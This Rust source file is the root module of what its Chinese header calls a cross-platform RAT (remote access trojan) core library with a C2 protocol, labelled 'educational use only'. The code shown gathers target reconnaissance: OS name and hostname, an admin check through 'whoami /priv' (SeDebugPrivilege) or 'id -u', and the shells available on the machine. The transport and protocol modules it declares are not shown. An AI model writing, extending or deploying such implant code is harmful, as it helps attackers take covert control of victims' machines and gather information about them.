//! # C2 Core — 跨平台 RAT 核心库
//!
//! 提供系统信息收集、跨平台权限/Shell 检测、C2 协议、传输层抽象、通道分离。
//! 仅供教育用途。

pub mod transport;
pub mod protocol;
pub mod channel;
pub mod detect;

use serde::{Deserialize, Serialize};
use sysinfo::System;

/// System information collected from the target machine.
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct SystemInfo {
    pub os_name: String,
    pub hostname: String,
    pub is_admin: bool,
    /// All available shells detected on the machine
    pub available_shells: Vec<detect::AvailableShell>,
}

// ── Platform-specific admin / debug-privilege check ────────────────

#[cfg(target_os = "windows")]
fn has_debug_privilege() -> bool {
    let output = std::process::Command::new("whoami")
        .arg("/priv")
        .output()
        .ok();

    match output {
        Some(out) if out.status.success() => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            stdout
                .lines()
                .any(|line| line.contains("SeDebugPrivilege") && line.contains("Enabled"))
        }
        _ => false,
    }
}

#[cfg(target_os = "linux")]
fn has_debug_privilege() -> bool {
    let output = std::process::Command::new("id")
        .arg("-u")
        .output()
        .ok();

    match output {
        Some(out) if out.status.success() => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            stdout.trim() == "0"
        }
        _ => false,
    }
}

#[cfg(not(any(target_os = "windows", target_os = "linux")))]
fn has_debug_privilege() -> bool {
    false
}

// ── Public API ─────────────────────────────────────────────────────

/// Collect system information from the current machine.
pub fn collect_info() -> SystemInfo {
    SystemInfo {
        os_name: System::name().unwrap_or_else(|| "Unknown".into()),
        hostname: System::host_name().unwrap_or_else(|| "Unknown".into()),
        is_admin: has_debug_privilege(),
        available_shells: detect::detect_shells(),
    }
}
